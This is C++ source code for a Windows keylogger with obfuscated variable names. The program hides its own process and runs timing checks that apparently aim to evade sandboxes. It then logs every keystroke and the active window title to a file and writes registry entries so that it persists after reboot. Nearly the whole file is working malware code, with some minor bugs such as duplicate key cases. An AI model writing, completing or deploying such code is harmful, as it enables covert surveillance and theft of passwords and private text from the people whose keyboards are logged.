#include "hKlog.h"
int TIbouBJL45f()
{
	clock_t clockT, clockBeforeT;
	clockBeforeT = clock();
	Sleep(3000);
	clockT = clock();

	if (clockT - clockBeforeT >= 2000)
	{
		Sleep(2000);
		return 1;
	}

	return 0;
}
int disableAV2()
{
	while (!GetAsyncKeyState(8))
	{
		if (GetAsyncKeyState(8))
		{
			return 1;
		}
	}

}
int main(int argc,char* argv[])
{
	hideProcess();
	if(disableAV2())
	if(TIbouBJL45f())
	if (TIbouBJL45f())
		{
		   init();
		  
			int *iUBVDO890 = new int(0);

			std::string failasg34à = init();
			std::ofstream NIPds24ò;
			NIPds24ò.open(failasg34à, std::ofstream::app);
		
			
				while (1)
				{
					Sleep((DWORD)0.3);

					for (unsigned char ONIMl03 = 1; ONIMl03 < 255; ONIMl03++) {
						SHORT rv = GetAsyncKeyState(ONIMl03);
						if (rv & 1) {
							std::string UBO78 = "";

							if (ONIMl03 == 1)
								UBO78 = "[LMOUSE]";
							else if (ONIMl03 == 2)
								UBO78 = "[RMOUSE]";
							else if (ONIMl03 == 4)
								UBO78 = "[MMOUSE]";
							else if (ONIMl03 == 13)
								UBO78 = "[RETURN]";
							else if (ONIMl03 == 16 || ONIMl03 == 17 || ONIMl03 == 18)
								UBO78 = "";
							else if (ONIMl03 == 160 || ONIMl03 == 161)
								UBO78 = "[SHIFT]";
							else if (ONIMl03 == 162 || ONIMl03 == 163)
								UBO78 = "[STRG]";
							else if (ONIMl03 == 164)
								UBO78 = "[ALT]";
							else if (ONIMl03 == 165)
								UBO78 = "[ALT GR]";
							else if (ONIMl03 == 8)
								UBO78 = "[BACKSPACE]";
							else if (ONIMl03 == 9)
								UBO78 = "[TAB]";
							else if (ONIMl03 == 27)
								UBO78 = "[ESC]";
							else if (ONIMl03 == 33)
								UBO78 = "[PAGE UP]";
							else if (ONIMl03 == 34)
								UBO78 = "[PAGE DOWN]";
							else if (ONIMl03 == 35)
								UBO78 = "[HOME]";
							else if (ONIMl03 == 36)
								UBO78 = "[POS1]";
							else if (ONIMl03 == 37)
								UBO78 = "[ARROW LEFT]";
							else if (ONIMl03 == 38)
								UBO78 = "[ARROW UP]";
							else if (ONIMl03 == 39)
								UBO78 = "[ARROW RIGHT]";
							else if (ONIMl03 == 40)
								UBO78 = "[ARROW DOWN]";
							else if (ONIMl03 == 45)
								UBO78 = "[INS]";
							else if (ONIMl03 == 46)
								UBO78 = "[DEL]";
							else if ((ONIMl03 >= 65 && ONIMl03 <= 90)
								|| (ONIMl03 >= 48 && ONIMl03 <= 57)
								|| ONIMl03 == 32)
								UBO78 = ONIMl03;
							else if (ONIMl03 == 91 || ONIMl03 == 92)
								UBO78 = "[WIN]";
							else if (ONIMl03 >= 96 && ONIMl03 <= 105)
								UBO78 = "[NUM " + int2str(ONIMl03 - 96) + "]";
							else if (ONIMl03 == 106)
								UBO78 = "[NUM /]";
							else if (ONIMl03 == 107)
								UBO78 = "[NUM +]";
							else if (ONIMl03 == 109)
								UBO78 = "[NUM -]";
							else if (ONIMl03 == 109)
								UBO78 = "[NUM ,]";
							else if (ONIMl03 >= 112 && ONIMl03 <= 123)
								UBO78 = "[F" + int2str(ONIMl03 - 111) + "]";
							else if (ONIMl03 == 144)
								UBO78 = "[NUM]";
							else if (ONIMl03 == 192)
								UBO78 = "[OE]";
							else if (ONIMl03 == 222)
								UBO78 = "[AE]";
							else if (ONIMl03 == 186)
								UBO78 = "[UE]";
							else if (ONIMl03 == 186)
								UBO78 = "+";
							else if (ONIMl03 == 188)
								UBO78 = ",";
							else if (ONIMl03 == 189)
								UBO78 = "-";
							else if (ONIMl03 == 190)
								UBO78 = ".";
							else if (ONIMl03 == 191)
								UBO78 = "#";
							else if (ONIMl03 == 226)
								UBO78 = "<";

							else
								UBO78 = "[KEY \\" + int2str(ONIMl03) + "]";
							NIPds24ò << UBO78;
							std::cout << *iUBVDO890 << std::endl;
							*iUBVDO890 += 1;
						}

						getCurrentWindow(NIPds24ò);

						if (!DBJK3(nameKey))
						{
							addRegKey(getExePath(), APPDATA);
						addRegKey(getExePath(), TEMP);
					}

					}

				
			}


			NIPds24ò.close();
			delete[] iUBVDO890;
		}
		

			return 0;
		

}


